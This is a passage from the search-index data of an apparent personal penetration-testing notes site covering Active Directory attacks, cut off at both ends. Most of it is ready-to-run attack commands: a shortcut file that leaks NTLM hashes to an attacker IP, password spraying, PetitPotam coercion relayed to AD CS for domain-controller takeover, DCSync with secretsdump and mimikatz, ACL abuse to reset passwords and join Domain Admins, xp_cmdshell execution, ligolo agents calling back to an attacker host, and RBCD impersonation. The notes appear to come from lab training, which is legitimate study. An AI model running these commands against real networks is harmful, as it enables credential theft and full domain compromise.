\"\\\\&lt;AttackerIP&gt;\\@ico.png\"\n$lnk.WindowStyle = 1\n$lnk.IconLocation = \"%windir%\\system32\\shell32.dll, 3\"\n$lnk.Description = \"IT Driver\"\n$lnk.HotKey = \"Ctrl+Alt+O\"\n$lnk.Save()\n</code></pre> Monitor for traffic with Responder on linux or Inveigh on windows.  Hash received? Try to crack it <pre><code>hashcat -m 5600 userr.hash /usr/share/wordlists/rockyou.txt\n</code></pre> OR:  Relay Attacks</p>","tags":["Initial-Access","Lateral-Movement","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Initial%20Access%20%26%20Delivery/NetNTLM%20Hash%20Stealing%20Locations/","title":"NetNTLM Hash Stealing Locations","text":"<p>https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/</p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Initial%20Access%20%26%20Delivery/Password%20Stuff/","title":"Password Stuff","text":"<p>note</p> <p>It is worth targeting high-value hosts such as <code>SQL</code> or <code>Microsoft Exchange</code> servers, as they are more likely to have a highly privileged user logged in or have their credentials persistent in memory.</p>","tags":["Authenticated","Initial-Access","Lateral-Movement","Privilege-Escalation","Unauthenticated","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Initial%20Access%20%26%20Delivery/Password%20Stuff/#wordlist-generation","title":"Wordlist Generation","text":"<p>Add likely words to a file (domain name, seasons, employees, etc). Use hashcat with ruleset to generate the alterations <pre><code>hashcat --force words.txt -r /usr/share/hashcat/rules/best64.rule --stdout &gt; wordlist.txt\n</code></pre> you should also prolly append an exclamation point to the words as well.</p>","tags":["Authenticated","Initial-Access","Lateral-Movement","Privilege-Escalation","Unauthenticated","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Initial%20Access%20%26%20Delivery/Password%20Stuff/#password-spraying","title":"Password Spraying","text":"","tags":["Authenticated","Initial-Access","Lateral-Movement","Privilege-Escalation","Unauthenticated","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Initial%20Access%20%26%20Delivery/Password%20Stuff/#from-linux","title":"From Linux","text":"<p><pre><code>for u in $(cat valid_users.txt);do rpcclient -U \"$u%Welcome1\" -c \"getusername;quit\" 172.16.5.5 | grep Authority; done\n</code></pre> <pre><code>kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1\n</code></pre> <pre><code>nxc smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +\n</code></pre> <pre><code>nxc smb 172.16.5.5 -u avazquez -p Password123\n</code></pre> Spray local admin hash around domain <pre><code>nxc smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +\n</code></pre></p> <p>note</p> <p>The <code>--local-auth</code> flag will tell the tool only to attempt to log in one time on each machine which removes any risk of account lockout. <code>Make sure this flag is set so we don't potentially lock out the built-in administrator for the domain</code></p> <p>From Windows https://github.com/dafthack/DomainPasswordSpray If we are authenticated to the domain, the tool will automatically generate a user list from Active Directory, query the domain password policy, and exclude user accounts within one attempt of locking out. <pre><code>Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue\n</code></pre> <pre><code>Invoke-DomainPasswordSpray -UserList users.txt -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue\n</code></pre></p>","tags":["Authenticated","Initial-Access","Lateral-Movement","Privilege-Escalation","Unauthenticated","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Initial%20Access%20%26%20Delivery/Password%20Stuff/#external-password-spraying","title":"External Password Spraying","text":"<ul> <li>Microsoft 0365</li> <li>Outlook Web Exchange</li> <li>Exchange Web Access</li> <li>Skype for Business</li> <li>Lync Server</li> <li>Microsoft Remote Desktop Services (RDS) Portals</li> <li>Citrix portals using AD authentication</li> <li>VDI implementations using AD authentication such as VMware Horizon</li> <li>VPN portals (Citrix, SonicWall, OpenVPN, Fortinet, etc. that use AD authentication)</li> <li>Custom web applications that use AD authentication</li> </ul>","tags":["Authenticated","Initial-Access","Lateral-Movement","Privilege-Escalation","Unauthenticated","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Initial%20Access%20%26%20Delivery/Password%20Stuff/#workarounds","title":"Workarounds","text":"<p>\u201cPassword must be changed on next logon\u201d \u201cPassword_must_change\u201d You can try two things <pre><code>rpcclient -U &lt;user&gt; &lt;IP&gt;\nrpcclient $&gt; setuserinfo2 &lt;user&gt; 23 'Password123!'\n</code></pre> <pre><code>smbpasswd -U &lt;user&gt; -r &lt;IP&gt;\n</code></pre></p>","tags":["Authenticated","Initial-Access","Lateral-Movement","Privilege-Escalation","Unauthenticated","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Initial%20Access%20%26%20Delivery/Password%20Stuff/#password-in-description-field","title":"Password in Description Field","text":"<p>Sensitive information such as account passwords are sometimes found in the user account Description or Notes fields and can be quickly enumerated using PowerView. For large domains, it is helpful to export this data to a CSV file to review offline.</p> <p>Remote <pre><code>nxc ldap &lt;hostname&gt; -u &lt;user&gt; -p &lt;pass&gt; -M get-desc-users\n</code></pre> Local <pre><code>Import-Module powerview.ps1\nGet-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}\n</code></pre></p>","tags":["Authenticated","Initial-Access","Lateral-Movement","Privilege-Escalation","Unauthenticated","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Initial%20Access%20%26%20Delivery/PetitPotam%20%28MS-EFSRPC%29/","title":"PetitPotam (MS EFSRPC)","text":"","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Initial%20Access%20%26%20Delivery/PetitPotam%20%28MS-EFSRPC%29/#attack-requirements","title":"Attack requirements","text":"Feature / Component Required for PetitPotam Required for Full Relay to DA via AD CS EFSRPC \u2705 Yes \u2705 Yes NTLM Enabled \u2705 Yes \u2705 Yes SMB/LDAP Signing Disabled \u2705 Yes (on relay target) \u2705 Yes (on certsrv or LDAP) AD CS Installed \u274c No \u2705 Yes Vulnerable AD CS Template \u274c No \u2705 Yes EPA / Channel Binding Off \u274c No \u2705 Yes","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Initial%20Access%20%26%20Delivery/PetitPotam%20%28MS-EFSRPC%29/#identify","title":"Identify","text":"<p><pre><code>nxc smb &lt;ip&gt; -u '' -p '' -M coerce_plus -o METHOD=PetitPotam\n</code></pre> shorthand <pre><code>nxc smb &lt;ip&gt; -u '' -p '' -M coerce_plus -o M=pe\n</code></pre></p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Initial%20Access%20%26%20Delivery/PetitPotam%20%28MS-EFSRPC%29/#exploit","title":"Exploit","text":"<p>https://github.com/topotam/PetitPotam https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1 </p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Initial%20Access%20%26%20Delivery/PetitPotam%20%28MS-EFSRPC%29/#start-ntlmrelayx","title":"Start ntlmrelayx","text":"<p><pre><code>sudo ntlmrelayx.py -debug -smb2support --target http://CA01.domain.local/certsrv/certfnsh.asp --adcs --template DomainController\n</code></pre> At the same time try to coerce DC to auth <pre><code>python3 PetitPotam.py &lt;attackerIP&gt; &lt;DCIP&gt;\n</code></pre> OR coerce with nxc <pre><code>nxc smb &lt;ip&gt; -u '' -p '' -M coerce_plus -o LISTENER=&lt;AttackerIP&gt; M=pe\n</code></pre></p> <p>You should receive a base64 encoded certificate in ntlmrelayx output Next, we can take this base64 certificate and use <code>gettgtpkinit.py</code> to request a Ticket-Granting-Ticket (TGT) for the domain controller. https://github.com/dirkjanm/PKINITtools.git <pre><code>python3 gettgtpkinit.py DOMAIN.LOCAL/DC01\\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache\n</code></pre> Set krb env variable <pre><code>export KRB5CCNAME=dc01.ccache\n</code></pre> Attempt DCSync <pre><code>impacket-secretsdump -just-dc-user DOMAIN/administrator -k -no-pass \"DC01$\"@DC01.DOMAIN.LOCAL\n</code></pre></p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Initial%20Access%20%26%20Delivery/ZeroLogon/","title":"ZeroLogon","text":""},{"location":"%F0%9F%AA%9F%20Active%20Directory/Initial%20Access%20%26%20Delivery/ZeroLogon/#identify","title":"Identify","text":"<p>remote <pre><code>nxc smb &lt;ip&gt; -u '' -p '' -M zerologon\n</code></pre></p>"},{"location":"%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Domain%20ACLs/","title":"Domain ACLs","text":"<p>List of abusable ACEs</p> <ul> <li><code>ForceChangePassword</code> abused with <code>Set-DomainUserPassword</code></li> <li><code>Add Members</code> abused with <code>Add-DomainGroupMember</code></li> <li><code>GenericAll</code> abused with <code>Set-DomainUserPassword</code> or <code>Add-DomainGroupMember</code></li> <li><code>GenericWrite</code> abused with <code>Set-DomainObject</code></li> <li><code>WriteOwner</code> abused with <code>Set-DomainObjectOwner</code></li> <li><code>WriteDACL</code> abused with <code>Add-DomainObjectACL</code></li> <li><code>AllExtendedRights</code> abused with <code>Set-DomainUserPassword</code> or <code>Add-DomainGroupMember</code></li> <li><code>Addself</code> abused with <code>Add-DomainGroupMember</code></li> </ul>","tags":["Add-Members","Addself","AllExtendedRights","DS-Replication-Get-Changes","ForceChangePassword","GenericAll","GenericWrite","Lateral-Movement","Persistence","Privilege-Escalation","Self-Membership","WriteDACL","WriteOwner","WriteProperty","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Domain%20ACLs/#identify","title":"Identify","text":"<p>Windows (powerview) <pre><code>Find-InterestingDomainAcl\n</code></pre> <pre><code>Import-Module .\\PowerView.ps1\n$sid = Convert-NameToSid wley\n</code></pre> <pre><code>Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} \n</code></pre> Check what objects have ACLs over a specific user <pre><code>Get-DomainObjectAcl -Identity harry.jones -Domain inlanefreight.local -ResolveGUIDs\n</code></pre></p> <p>ACLs are granted to USER1 over USER2 <pre><code>(Get-ACL \"AD:$((Get-ADUser &lt;USER2&gt;).distinguishedname)\").access  | ? {$_.IdentityReference -eq \"DOMAIN.LOCAL\\USER1\"}\n</code></pre> FInd all users with a specific ACL over USER1 (GenericAll in this example) <pre><code>(Get-ACL \"AD:$((Get-ADUser &lt;USER1&gt;).distinguishedname)\").access  | ? {$_.ActiveDirectoryRights -match \"WriteProperty\" -or $_.ActiveDirectoryRights -match \"GenericAll\"} | Select IdentityReference,ActiveDirectoryRights -Unique | ft -W\n</code></pre></p> <p>Note</p> <p>that if PowerView has already been imported, the cmdlet shown below will result in an error. Therefore, we may need to run it from a new PowerShell session. Or just look at bloodhound</p> <p>Manually <pre><code>Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName &gt; ad_users.txt\n</code></pre> <pre><code>foreach($line in [System.IO.File]::ReadLines(\"C:\\Users\\htb-student\\Desktop\\ad_users.txt\")) {get-acl  \"AD:\\$(Get-ADUser $line)\" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\\\wley'}}\n</code></pre> from here we would google the \u201cObjectType\u201d entry to find the rights the GUID represents</p>","tags":["Add-Members","Addself","AllExtendedRights","DS-Replication-Get-Changes","ForceChangePassword","GenericAll","GenericWrite","Lateral-Movement","Persistence","Privilege-Escalation","Self-Membership","WriteDACL","WriteOwner","WriteProperty","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Domain%20ACLs/#exploit","title":"Exploit","text":"","tags":["Add-Members","Addself","AllExtendedRights","DS-Replication-Get-Changes","ForceChangePassword","GenericAll","GenericWrite","Lateral-Movement","Persistence","Privilege-Escalation","Self-Membership","WriteDACL","WriteOwner","WriteProperty","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Domain%20ACLs/#force-change-password","title":"Force-Change-Password","text":"<p><pre><code>$SecPassword = ConvertTo-SecureString '&lt;PASSWORD HERE&gt;' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\\wley', $SecPassword) \n</code></pre> <pre><code>$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force\n</code></pre> <pre><code>Import-Module .\\Powerview.ps1\n</code></pre> <pre><code>Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose\n</code></pre></p>","tags":["Add-Members","Addself","AllExtendedRights","DS-Replication-Get-Changes","ForceChangePassword","GenericAll","GenericWrite","Lateral-Movement","Persistence","Privilege-Escalation","Self-Membership","WriteDACL","WriteOwner","WriteProperty","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Domain%20ACLs/#add-domaingroupmember","title":"Add-DomainGroupMember","text":"<p><pre><code>$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\\damundsen', $SecPassword) \n</code></pre> <pre><code>Import-Module .\\Powerview.ps1\n</code></pre> <pre><code>Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose\n</code></pre> <pre><code>Get-DomainGroupMember -Identity \"Help Desk Level 1\" | Select MemberName\n</code></pre></p>","tags":["Add-Members","Addself","AllExtendedRights","DS-Replication-Get-Changes","ForceChangePassword","GenericAll","GenericWrite","Lateral-Movement","Persistence","Privilege-Escalation","Self-Membership","WriteDACL","WriteOwner","WriteProperty","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Domain%20ACLs/#genericall","title":"GenericAll","text":"<p>Targeted kerberoast <pre><code>Import-Module .\\Powerview.ps1\n</code></pre> <pre><code>Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose\n</code></pre> <pre><code>.\\Rubeus.exe kerberoast /user:adunn /nowrap\n</code></pre> Add user to domain admins <pre><code>Net group \"domain admins\" &lt;user&gt; /add /domain\n</code></pre></p>","tags":["Add-Members","Addself","AllExtendedRights","DS-Replication-Get-Changes","ForceChangePassword","GenericAll","GenericWrite","Lateral-Movement","Persistence","Privilege-Escalation","Self-Membership","WriteDACL","WriteOwner","WriteProperty","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Domain%20ACLs/#ds-replication-get-changes-all","title":"DS-Replication-Get-Changes-All","text":"<p>From linux <pre><code>secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5\n</code></pre> From windows <pre><code>runas /netonly /user:INLANEFREIGHT\\adunn powershell\n</code></pre> <pre><code>.\\mimikatz.exe\nprivilege::debug\nlsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\\administrator\n</code></pre></p>","tags":["Add-Members","Addself","AllExtendedRights","DS-Replication-Get-Changes","ForceChangePassword","GenericAll","GenericWrite","Lateral-Movement","Persistence","Privilege-Escalation","Self-Membership","WriteDACL","WriteOwner","WriteProperty","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Domain%20ACLs/#remove-spn","title":"Remove SPN","text":"<p>Removing the Fake SPN from adunn's Account <pre><code>Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose\n</code></pre> Removing damundsen from the Help Desk Level 1 Group <pre><code>Remove-DomainGroupMember -Identity \"Help Desk Level 1\" -Members 'damundsen' -Credential $Cred2 -Verbose\n</code></pre> Confirming damundsen was Removed from the Group <pre><code>Get-DomainGroupMember -Identity \"Help Desk Level 1\" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose\n</code></pre></p>","tags":["Add-Members","Addself","AllExtendedRights","DS-Replication-Get-Changes","ForceChangePassword","GenericAll","GenericWrite","Lateral-Movement","Persistence","Privilege-Escalation","Self-Membership","WriteDACL","WriteOwner","WriteProperty","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Domain%20ACLs/#genericwrite-on-user","title":"GenericWrite on User","text":"","tags":["Add-Members","Addself","AllExtendedRights","DS-Replication-Get-Changes","ForceChangePassword","GenericAll","GenericWrite","Lateral-Movement","Persistence","Privilege-Escalation","Self-Membership","WriteDACL","WriteOwner","WriteProperty","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Domain%20ACLs/#targeted-kerberoasting","title":"Targeted Kerberoasting","text":"<p>Set SPN (if you're running a process as the user with GenericWrite) <pre><code>setspn -a domain.local/user.domain.local:1337 domain.local\\user\n</code></pre></p> <p>If your're running as different user</p> <p>Import-Module .\\Powerview.ps1 $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('object.local\\smith', $SecPassword)</p> <p>Set-DomainObject -Credential $Cred -Identity maria -SET @{serviceprincipalname='foobar/xd'}</p>","tags":["Add-Members","Addself","AllExtendedRights","DS-Replication-Get-Changes","ForceChangePassword","GenericAll","GenericWrite","Lateral-Movement","Persistence","Privilege-Escalation","Self-Membership","WriteDACL","WriteOwner","WriteProperty","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Domain%20ACLs/#change-users-logon-scripts","title":"Change users logon scripts","text":"<p>Global writeable location <pre><code>cd C:\\programdata\\\necho 'whoami &gt; C:\\programdata\\out.txt' &gt; test.ps1\n\nSet-DomainObject -Identity &lt;targetuser&gt; -SET @{scriptpath='C:\\programdata\\test.ps1'}\n</code></pre> check if it worked <pre><code>net user &lt;target user&gt;\n</code></pre></p>","tags":["Add-Members","Addself","AllExtendedRights","DS-Replication-Get-Changes","ForceChangePassword","GenericAll","GenericWrite","Lateral-Movement","Persistence","Privilege-Escalation","Self-Membership","WriteDACL","WriteOwner","WriteProperty","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Group%20Policy%20Abuse/","title":"Group Policy Abuse","text":"","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Group%20Policy%20Abuse/#identify","title":"Identify","text":"<p><pre><code>Get-GPO -All | Select DisplayName\n</code></pre> Check if group has control <pre><code>$sid=Convert-NameToSid \"Domain Users\"\nGet-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}\n</code></pre> Converting GPO GUID to Name <pre><code>Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532\n</code></pre> group3r https://github.com/Group3r/Group3r <pre><code>group3r.exe -f &lt;filepath-name.log&gt; \n</code></pre></p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Group%20Policy%20Abuse/#in-bloodhound","title":"In BloodHound","text":"<p>Checking in BloodHound, we can see that the <code>Domain Users</code> group has several rights over the <code>Disconnect Idle RDP</code> GPO, which could be leveraged for full control of the object.</p> <p>If we select the GPO in BloodHound and scroll down to <code>Affected Objects</code> on the <code>Node Info</code> tab, we can see that this GPO is applied to one OU, which contains four computer objects.</p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Group%20Policy%20Abuse/#exploit","title":"Exploit","text":"<p>https://github.com/FSecureLABS/SharpGPOAbuse We could use a tool such as SharpGPOAbuse to take advantage of this GPO misconfiguration by performing actions such as adding a user that we control to the local admins group on one of the affected hosts, creating an immediate scheduled task on one of the hosts to give us a reverse shell, or configure a malicious computer startup script to provide us with a reverse shell or similar.</p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Kerberos%20Double%20Hop/","title":"Kerberos Double Hop","text":"","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Kerberos%20Double%20Hop/#explainer","title":"Explainer","text":"<p>If you\u2019re accessing a resource with network authentication, like winrm, your creds may not be cached in memory. Because of this, actions you take that you have permissions to take may be denied. The DC cannot recognize your access rights.</p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Kerberos%20Double%20Hop/#workarounds","title":"Workarounds","text":"","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Kerberos%20Double%20Hop/#1-use-invoke-command-to-pass-a-pscredential-object-with-every-request","title":"1. Use Invoke-Command to pass a PSCredential object with every request","text":"<p><pre><code>$SecPassword = ConvertTo-SecureString 'password' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\\user', $SecPassword)\n</code></pre> <pre><code>Import-Module powerview.ps1\nget-domainuser -spn -credential $Cred | select samaccountname\n</code></pre></p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Kerberos%20Double%20Hop/#2-register-pssession-configuration-from-windows","title":"2. Register PSSession Configuration (from windows)","text":"<p><pre><code>Register-PSSessionConfiguration -Name &lt;namethesessionyhere&gt; -RunAsCredential domain\\user\n</code></pre> <pre><code>Restart-Service WinRM\n</code></pre> <pre><code>Enter-PSSession -ComputerName computer01 -Credential domain\\user -ConfigurationName &lt;whateveryouanemdthesession&gt;\n</code></pre></p> <p>Note: We cannot use Register-PSSessionConfiguration from an evil-winrm shell because we won't be able to get the credentials popup. Furthermore, if we try to run this by first setting up a PSCredential object and then attempting to run the command by passing credentials like -RunAsCredential $Cred, we will get an error because we can only use RunAs from an elevated PowerShell terminal.</p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/MSSQL%20Abuse/","title":"MSSQL Abuse","text":"","tags":["Authenticated","Lateral-Movement","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/MSSQL%20Abuse/#identify","title":"Identify","text":"<p>https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet <pre><code>Import-Module .\\PowerUpSQL.ps1\nGet-SQLInstanceDomain\n</code></pre> Connect - Windows <pre><code>Get-SQLQuery -Verbose -Instance \"host,port\" -username \"domain.local\\\\user\" -password \"password\" -query 'Select @@version'\n</code></pre> Connect - Linux <pre><code>impacket-mssqlclient user:'pass'@&lt;IP&gt; -windows-auth\n</code></pre></p>","tags":["Authenticated","Lateral-Movement","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/MSSQL%20Abuse/#exploit","title":"Exploit","text":"<p>Run commands with xp_cmdshell <pre><code>SQL&gt; enable_xp_cmdshell\nxp_cmdshell whoami /priv\n</code></pre></p>","tags":["Authenticated","Lateral-Movement","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Pivoting/","title":"Pivoting","text":"","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Pivoting/#ligolong","title":"LigoloNG","text":"<p>https://github.com/Nicocha30/ligolo-ng</p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Pivoting/#single-pivot","title":"Single pivot","text":"<p>Attack host: <pre><code>sudo ip tuntap add user kali mode tun ligolo ; sudo ip link set ligolo up\n</code></pre> <pre><code>./proxy -selfcert -laddr 0.0.0.0:443\n</code></pre> add route to new subnet <pre><code>sudo ip route add 172.16.139.0/24 dev ligolo\n</code></pre> Target: <pre><code>agent.exe -connect &lt;attackIP&gt;:443 -ignore-cert\n</code></pre> Attack host: select session <pre><code>session\n</code></pre> add listeners <pre><code>listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80\nlistener_add --addr 0.0.0.0:8081 --to 127.0.0.1:81\nlistener_add --addr 0.0.0.0:8082 --to 127.0.0.1:82\nlistener_add --addr 0.0.0.0:8083 --to 127.0.0.1:83\nlistener_add --addr 0.0.0.0:8084 --to 127.0.0.1:84\n</code></pre> start tunnel <pre><code>start\n</code></pre></p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Pivoting/#double-pivot","title":"Double Pivot","text":"<p>Attack host: <pre><code>sudo ip tuntap add user kali mode tun double ; sudo ip link set double up\nsudo ip tuntap add user kali mode tun ligolo ; sudo ip link set ligolo up\n</code></pre> <pre><code>./proxy -selfcert -laddr 0.0.0.0:443\n</code></pre> Target: First pivot callback <pre><code>agent.exe -connect &lt;attackIP&gt;:443 -ignore-cert\n</code></pre> Attack host: Add routes <pre><code>sudo ip route add 172.16.139.0/24 dev ligolo\nsudo ip route add 172.16.210.0/24 dev double\n</code></pre> select session <pre><code>session\n</code></pre> add listener for second pivot <pre><code>listener_add --addr 0.0.0.0:139 --to 127.0.0.1:443\n</code></pre> add normal listeners <pre><code>listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80\nlistener_add --addr 0.0.0.0:8081 --to 127.0.0.1:81\nlistener_add --addr 0.0.0.0:8082 --to 127.0.0.1:82\nlistener_add --addr 0.0.0.0:8083 --to 127.0.0.1:83\nlistener_add --addr 0.0.0.0:8084 --to 127.0.0.1:84\n</code></pre> start first tunnel <pre><code>start\n</code></pre> Second target: Call back to first pivot host from second <pre><code>agent.exe -connect &lt;targetONE&gt;:139 -ignore-cert\n</code></pre> add listeners to second host <pre><code>listener_add --addr 0.0.0.0:5050 --to 127.0.0.1:50\nlistener_add --addr 0.0.0.0:5051 --to 127.0.0.1:51\nlistener_add --addr 0.0.0.0:5052 --to 127.0.0.1:52\nlistener_add --addr 0.0.0.0:5053 --to 127.0.0.1:53\nlistener_add --addr 0.0.0.0:5054 --to 127.0.0.1:54\n</code></pre> start second tunnell <pre><code>start --tun double\n</code></pre> Verify access <pre><code>nxc smb 172.16.139.10/24 \nnxc smb 172.16.210.0/24\n</code></pre></p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Relay%20Attacks/","title":"Relay Attacks","text":"<p>https://blog.fox-it.com/2017/05/09/relaying-credentials-everywhere-with-ntlmrelayx/</p> <p>Relay captures hashes to target machine for various types of access. - Only works if SMB signing is disabled or \"not required\" - Relayed creds MUST be admin on the machine</p>","tags":["Initial-Access","LLMNR","NETBIOS","SMB","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Relay%20Attacks/#responder-ntlmrelayx","title":"Responder + ntlmrelayx","text":"<p>Edit responder conf: <pre><code>sudo nano /etc/responder/Responder.conf\nSMB = On ---&gt; Off\nHTTP = on ---&gt; Off\n</code></pre> Make targets list <pre><code>echo \"&lt;TargetIP&gt;\" &gt; targets.txt\n</code></pre> Run responder <pre><code>sudo responder -I eth0 -wv\n</code></pre> Start ntlmrelayx with any of these options</p> <p>Dump hashes <pre><code>sudo impacket-ntlmrelayx -tf targets.txt -smb2support\n</code></pre> Get semi-interactive smbexec bind shell (<code>nc localhost 11000</code>) <pre><code>sudo impacket-ntlmrelayx -tf targets.txt -smb2support -i\n</code></pre> Execute payload <pre><code>sudo impacket-ntlmrelayx -tf targets.txt -smb2support -e payload.exe\n</code></pre> Execute Command <pre><code>sudo impacket-ntlmrelayx -tf targets.txt -smb2support -c 'whoami'\n</code></pre> Wait for auth attempt (or coerce auth attempt)</p>","tags":["Initial-Access","LLMNR","NETBIOS","SMB","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Resource-Based%20Constrained%20Delegation/","title":"Resource Based Constrained Delegation","text":"","tags":["Authenticated","Elevated","Kerberos","msDS-AllowedToActOnBehalfOfOtherIdentity","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Resource-Based%20Constrained%20Delegation/#linux","title":"Linux","text":"","tags":["Authenticated","Elevated","Kerberos","msDS-AllowedToActOnBehalfOfOtherIdentity","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Resource-Based%20Constrained%20Delegation/#with-nxc","title":"With nxc","text":"<p>impersonate administrator given <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> is set on account we control <pre><code>nxc smb 192.168.56.11 -u jon.snow -p iknownothing --delegate Administrator\n</code></pre></p>","tags":["Authenticated","Elevated","Kerberos","msDS-AllowedToActOnBehalfOfOtherIdentity","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Resource-Based%20Constrained%20Delegation/#with-impacket","title":"With impacket","text":"<p>Add computer you control <pre><code>impacket-addcomputer -computer-name 'rbcd-test$' -computer-pass 'Megaman!1' -dc-ip 192.168.0.100 its-piemonte.local/tantani:'AAAAaaaa!1'\n</code></pre> example with hash <pre><code>impacket-addcomputer -computer-name 'rbcd$' -computer-pass 'Password123!' -dc-ip 192.168.146.175 resourced.local/L.Livingstone -hashes :19a3a7550ce8c505c2d46b5e39d6f808\n</code></pre> Configure delegation rights <pre><code>impacket-rbcd -delegate-to 'its-dc1$' -delegate-from 'rbcd-test$' -dc-ip 192.168.0.100 -action write its-piemonte/tantani:'AAAAaaaa!1'\n</code></pre> Example with hash <pre><code>impacket-rbcd -delegate-to 'RESOURCEDC$' -delegate-from 'rbcd$' -dc-ip 192.168.146.175 -action write resourced.local/L.Livingstone -hashes :19a3a7550ce8c505c2d46b5e39d6f808\n</code></pre> Request ticket for admin <pre><code>impacket-getST -spn cifs/its-dc1.its-piemonte.local -impersonate Administrator -dc-ip 192.168.0.100 its-piemonte.local/rbcd-test:'Megaman!1'\n</code></pre> another example <pre><code>impacket-getST -spn cifs/RESOURCEDC.resourced.local -impersonate Administrator -dc-ip 